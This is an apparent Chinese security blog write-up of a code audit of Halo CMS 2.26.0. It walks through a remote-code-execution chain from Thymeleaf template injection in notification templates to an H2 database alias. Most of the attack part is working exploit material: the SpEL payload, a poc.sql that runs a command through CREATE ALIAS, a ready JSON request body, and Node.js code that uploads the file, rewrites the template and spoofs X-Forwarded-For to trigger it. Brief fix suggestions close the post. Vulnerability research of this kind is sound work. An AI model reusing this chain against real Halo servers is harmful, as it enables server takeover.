#  从 Halo 通知模板 SSTI 到 H2 Alias RCE：一次完整的踩坑记录  
一寸灰
                    一寸灰  进击安全   2026-09-02 03:24  
  
> 本文来自一次真实代码审计与漏洞复现。目标环境为本地 localhost:8090，Halo 版本 2.26.0，项目源码 2.26.0-SNAPSHOT。最终成功弹出 calc.exe。  
  
## 一、前言：为什么会盯上通知模板  
  
Halo 是一款基于  
Spring Boot WebFlux + R2DBC + Thymeleaf的开源 CMS。在审计过程中，我们发现后台允许管理员自定义  
通知模板（NotificationTemplate），而这些模板最终会被 Thymeleaf 渲染成通知标题、正文等内容。  
  
直觉上，如果模板内容没有经过任何过滤，就存在  
SSTI（Server-Side Template Injection）的风险。于是沿着这条线往下挖，最终形成了一条完整的 RCE 链：  
```
管理员登录
 → 上传 poc.sql 到附件目录
 → 篡改 new-device-login 通知模板
 → 新设备登录触发通知
 → Thymeleaf 渲染模板
 → SpringEL 执行
 → SimpleDriverDataSource.getConnection()
 → H2 RUNSCRIPT FROM 本地 poc.sql
 → CREATE ALIAS + CALL calc()
 → calc.exe 弹出
```  
  
下面会把整个过程中的关键点、踩坑点和修复思路逐一展开。  
## 二、漏洞定位：Source 与 Sink  
### 2.1 Source：管理员能把任意字符串写进模板  
  
Halo 的扩展资源通过统一的 CRD API 暴露。通知模板作为一种 Extension，更新入口在：  
```
@Override
public Mono handle(ServerRequest request) {
 String name = request.pathVariable(”name”);
 return request.bodyToMono(Unstructured.class) // Source 在这里
 .filter(unstructured -> unstructured.getMetadata() != null
 && StringUtils.hasText(unstructured.getMetadata().getName())
 && Objects.equals(unstructured.getMetadata().getName(), name))
 .switchIfEmpty(Mono.error(
 () -> new ServerWebInputException(”Cannot read body to ” + scheme.groupVersionKind())))
 .flatMap(client::update) // 写入数据库
 .flatMap(updated -> ServerResponse.ok()
 .contentType(MediaType.APPLICATION_JSON)
 .bodyValue(updated));
}
```  
  
攻击者向下面这个地址发送 PUT 请求：  
```
/apis/notification.halo.run/v1alpha1/notificationtemplates/template-new-device-login
```  
  
就能把 spec.template.title、rawBody、htmlBody 替换成任意字符串，而且这些内容会被原封不动地存进数据库。  
### 2.2 Sink：模板内容被 Thymeleaf 直接渲染  
  
真正执行模板的地方是：  
```
@Component
@RequiredArgsConstructor
public class DefaultNotificationTemplateRender implements NotificationTemplateRender {
 
 private static final TemplateEngine TEMPLATE_ENGINE = createTemplateEngine();
 
 @Override
 public Mono render(String template, Map model) {
 var context = new Context(Locale.getDefault(), model);
 ...
 return Mono.when(globalAttributeMono)
 .then(Mono.fromSupplier(() ->
 TEMPLATE_ENGINE.process(defaultString(template), context) // Sink 在这里
 ));
 }
 
 static TemplateEngine createTemplateEngine() {
 var template = new SpringTemplateEngine();
 template.setTemplateResolver(new StringTemplateResolver()); // 字符串模板，无过滤
 return template;
 }
}
```  
  
注意两个重点：  
  
也就是说，title 字段里写 [[${...}]]，Thymeleaf 就会把它当 SpringEL 表达式执行。  
### 2.3 触发路径：新设备登录通知  
  
new-device-login 通知的触发点在：  
```
@EventListener
Mono onApplicationEvent(NewDeviceLoginEvent event) {
 return subscribeForNewDeviceLoginReason(event.getDevice())
 .then(sendNewDeviceNotification(event.getDevice()));
}
 
Mono sendNewDeviceNotification(Device device) {
 return notificationReasonEmitter.emit(REASON_TYPE, builder -> { // REASON_TYPE = ”new-device-login”
 ...
 });
}
```  
  
最终 DefaultNotificationCenter.inferenceTemplate() 会把 title、rawBody、htmlBody 三处都送进 DefaultNotificationTemplateRender.render()：  
```
var titleMono = notificationTemplateRender
 .render(templateContent.getTitle(), model)
 .doOnNext(builder::title);
 
var rawBodyMono = notificationTemplateRender
 .render(templateContent.getRawBody(), model)
 .doOnNext(builder::rawBody);
 
var htmlBodyMono = notificationTemplateRender
 .render(templateContent.getHtmlBody(), model)
 .doOnNext(builder::htmlBody);
```  
  
所以只要改 title，就能在通知触发时执行任意 SpEL。  
## 三、第一道坎：Thymeleaf 的 ACL 黑名单  
  
如果只是简单的 SSTI，第一反应肯定是：  
```
[[${T(java.lang.Runtime).getRuntime().exec(”calc”)}]]
```  
  
但在 Thymeleaf 3.1.3 里，这招走不通。  
  
Thymeleaf 在 org.thymeleaf.util.ExpressionUtils 里维护了一套 ACL，反编译后可以看到它把常见的高危包都拉黑了：  
```
// 全局黑名单
private static final Set BLOCKED_ALL_PURPOSES_PACKAGE_NAME_PREFIXES = Set.of(
 ”java.”, ”javax.”, ”jakarta.”, ”jdk.”,
 ”org.ietf.jgss.”, ”org.omg.”, ”org.w3c.dom.”, ”org.xml.sax.”,
 ”com.sun.”, ”sun.”
);
 
// 仅允许 java.time.
private static final Set ALLOWED_ALL_PURPOSES_PACKAGE_NAME_PREFIXES = Set.of(
 ”java.time.”
);
 
// 类型引用黑名单
private static final Set BLOCKED_TYPE_REFERENCE_PACKAGE_NAME_PREFIXES = Set.of(
 ”org.springframework.web.”, ”org.springframework.context.”,
 ”org.springframework.beans.”, ”org.springframework.aspects.”,
 ”org.springframework.aop.”, ”org.springframework.expression.”,
 ”org.springframework.util.”,
 ”org.objectweb.asm.”, ”javassist.”, ”net.bytebuddy.”, ”org.aspectj.”,
 ...
);
```  
  
判断逻辑大致是：先查白名单，再查黑名单。于是 java.lang.Runtime、java.lang.ProcessBuilder、javax.script.、org.springframework.expression.spel.  
 等常规 RCE 路径全部被堵死。  
## 四、第二道坎：H2 URL 里写多语句会被截断  
  
既然直接调 Runtime.exec 不行，就要找一个  
不在黑名单里、又能触发代码执行的类。  
  
这里用到两个关键点：  
  
于是可以构造：  
```
new org.springframework.jdbc.datasource.SimpleDriverDataSource(
 new org.h2.Driver(),
 'jdbc:h2:mem:rcepoc;INIT=',
 'sa',
 '').getConnection()
```  
  
H2 的 INIT 参数会在建立连接时执行一条 SQL。我们本来希望直接写：  
```
jdbc:h2:mem:rcepoc;INIT=CREATE ALIAS calc AS '...'; CALL calc()
```  
  
但实测发现 H2 URL 解析器会按 ; 切分 key/value，INIT 的值会被截断成只有 CREATE ALIAS calc AS '...'，后面的 CALL calc() 直接丢掉。  
  
解决办法：用 RUNSCRIPT FROM '<文件路径>'，让 H2 去读一个完整的 SQL 脚本，脚本内部可以写多条语句。  
  
poc.sql 内容：  
```
DROP ALIAS IF EXISTS calc;
CREATE ALIAS calc AS 'String calc() throws Exception { java.lang.Runtime.getRuntime().exec(”calc”); return ”done”; }';
CALL calc();
```  
## 五、第三道坎：文件怎么送上去  
  
早期版本为了把 poc.sql 传给 H2，需要在本机起一个 HTTP 服务，让 H2 通过 RUNSCRIPT FROM 'http://127.0.0.1:18080/poc.sql' 下载。但这样依赖额外服务，不够优雅。  
  
后来发现 Halo 默认的  
附件上传接口不做后缀白名单，可以直接把 poc.sql 上传到：  
```
~/.halo2/attachments/upload/poc.sql
```  
  
上传端点：  
```
POST /apis/api.console.halo.run/v1alpha1/attachments/upload
Content-Type: multipart/form-data
```  
  
表单字段：  
- file：要上传的文件  
  
- policyName：default-policy  
  
Node.js 上传代码：  
```
const PAYLOAD_SQL = fs.readFileSync('poc.sql', 'utf8');
 
async function uploadPocSql(cookies) {
 const form = new FormData();
 form.append('file', new Blob([PAYLOAD_SQL], { type: 'application/octet-stream' }), 'poc.sql');
 form.append('policyName', 'default-policy');
 
 const res = await fetch('http://localhost:8090/apis/api.console.halo.run/v1alpha1/attachments/upload', {
 method: 'POST',
 headers: { Cookie: cookieString(cookies) },
 body: form,
 });
 if (res.status !== 200) {
 throw new Error(`Upload failed: ${res.status}`);
 }
 console.log('[+] poc.sql uploaded to ~/.halo2/attachments/upload/poc.sql');
}
```  
  
H2 在 Windows 下也能正确解析 ~ 为用户主目录，所以本地文件 URL 写成：  
```
file:~/.halo2/attachments/upload/poc.sql
```  
  
即可。  
## 六、PoC 构造：一步步拼起来  
### 6.1 构造 Thymeleaf payload  
```
const LOCAL_SQL_URL = 'file:~/.halo2/attachments/upload/poc.sql';
 
const RCE_TEMPLATE_TITLE = (() => {
 const urlValue = `jdbc:h2:mem:rcepoc;INIT=RUNSCRIPT FROM '${LOCAL_SQL_URL}'`;
 const spelExpr = [
 'new org.springframework.jdbc.datasource.SimpleDriverDataSource(',
 'new org.h2.Driver(), ',
 ”'” + urlValue.replace(/'/g, ”''”) + ”', ”, // SpEL 字符串里单引号要转义
 ”'sa', ”,
 ”''”,
 ').getConnection()'
 ].join('');
 return '[[' + '${' + spelExpr + '}' + ']]';
})();
```  
  
最终写入 NotificationTemplate.title 的字符串：  
```
[[${new org.springframework.jdbc.datasource.SimpleDriverDataSource(
 new org.h2.Driver(),
 'jdbc:h2:mem:rcepoc;INIT=RUNSCRIPT FROM ''file:~/.halo2/attachments/upload/poc.sql''',
 'sa',
 '').getConnection()}]]
```  
  
可以直接用于 curl 的请求体（payload.json）：  
```
{
 ”apiVersion”: ”notification.halo.run/v1alpha1”,
 ”kind”: ”NotificationTemplate”,
 ”metadata”: { ”name”: ”template-new-device-login” },
 ”spec”: {
 ”reasonSelector”: {
 ”language”: ”default”,
 ”reasonType”: ”new-device-login”
 },
 ”template”: {
 ”title”: ”[[${new org.springframework.jdbc.datasource.SimpleDriverDataSource(new org.h2.Driver(), 'jdbc:h2:mem:rcepoc;INIT=RUNSCRIPT FROM ''file:~/.halo2/attachments/upload/poc.sql''', 'sa', '').getConnection()}]]”,
 ”rawBody”: ”RCE POC raw body”,
 ”htmlBody”: ”RCE POC html body”
 }
 }
}
```  
### 6.2 完整执行流程  
  
rce_poc.js 的完整流程如下：  
```
// 1. 获取 CSRF token 和 RSA 公钥
const { csrf, publicKey, cookies } = await getLoginPage();
 
// 2. 第一次管理员登录
const loginA = await doLogin(csrf, cookies, publicKey, 'Halo-RCE-Browser-A/1.0', '10.0.0.1');
 
// 3. 上传 poc.sql 到附件目录
await uploadPocSql(loginA.cookies);
 
// 4. 把 new-device-login 模板 title 替换成 RCE payload
await updateNotificationTemplate(loginA.cookies, RCE_TEMPLATE_TITLE);
 
// 5. 再次获取 CSRF，第二次登录（不同 UA / IP，触发新设备通知）
const loginPageB = await getLoginPage();
const loginB = await doLogin(loginPageB.csrf, loginPageB.cookies, loginPageB.publicKey,
 'Halo-RCE-Browser-B/2.0 (Different)', '10.0.0.2');
 
// 6. 等待通知触发
await new Promise(r => setTimeout(r, 8000));
 
// 7. 还原模板，避免反复弹窗
await restoreNotificationTemplate(loginA.cookies);
```  
### 6.3 为什么第二次登录要换 UA 和 X-Forwarded-For  
- Halo 登录接口有基于 IP 的限流，同一 IP 频繁登录会被拦截；  
  
- IpAddressUtils 会优先读取 X-Forwarded-For 作为客户端 IP，所以每次换这个头就能拿到新的限流桶；  
  
- new-device-login 的设备识别依赖 User-Agent 和 IP，第二次用不同 UA/IP 会被识别为新设备，从而触发通知渲染。  
  
## 七、验证结果  
  
执行：  
```
node rce_poc.js
```  
  
输出：  
```
[*] GET /login
[+] CSRF token obtained: sFOrVpMsDiknG70ypwzb...
[+] Public key obtained from login page
[*] POST /login (User-Agent: Halo-RCE-Browser-A/1.0) (X-Forwarded-For: 10.0.0.1)
[+] First login successful (status 302)
[*] Uploading poc.sql via attachment API
[+] Upload success: 200
[*] GET /apis/notification.halo.run/v1alpha1/notificationtemplates/template-new-device-login
[*] PUT /apis/notification.halo.run/v1alpha1/notificationtemplates/template-new-device-login
[+] Notification template updated
[*] GET /login
[*] POST /login (User-Agent: Halo-RCE-Browser-B/2.0 (Different)) (X-Forwarded-For: 10.0.0.2)
[+] Second login successful (status 302)
[*] Waiting for notification trigger...
[+] Notification template restored
[*] If the exploit worked, calc.exe should have opened on the server.
```  
  
计算器出来了，RCE 验证成功。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/E82PIufwB5xrlS3ztIibUK20J3G2ZbIRDkWIgz2rtdALEu0suOv8TwodOVbRViaRLoibcMAoSo4DSW95xMFCTVxUcuXLnecqicvpKlRKMuY39Tw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=0 "")  
## 八、修复思路  
- 默认策略不应允许 ALL 类型，要加后缀白名单；  
  
- 禁止上传 .sql、.sh、.bat、.class 等可解释/可执行文件；  
  
- 附件存储目录与 H2/JDBC 工作目录隔离。  
  
## 九、写在最后  
  
这条链的有趣之处在于：  
- 它不是简单的 SSTI 直接 RCE；  
  
- Thymeleaf 黑名单把常见绕过都堵了，但漏掉了 Spring JDBC + H2 这个利用链；  
  
- H2 的 CREATE ALIAS 机制相当于在 JVM 内部提供了一个“动态编译器”，让我们绕过了 Thymeleaf 对 java.lang.Runtime 的直接限制；  
  
- 最后通过一个不起眼的附件上传功能，把外部 payload 送到了 H2 能读取的位置。  
  
希望对大家做代码审计和漏洞挖掘有所启发。最后就是AI审洞真jb牛逼。  
```
```  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTRxkd3micVn1PMYRvKqyQVltsXVhRNPBrrUEO0wcpad1cyPo2MY0Uy138YkQia9YKRRTudQRniaVic5MUtmuDibHMyEr08GVRnsjeQ/640?wx_fmt=png&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=23 "")  
  
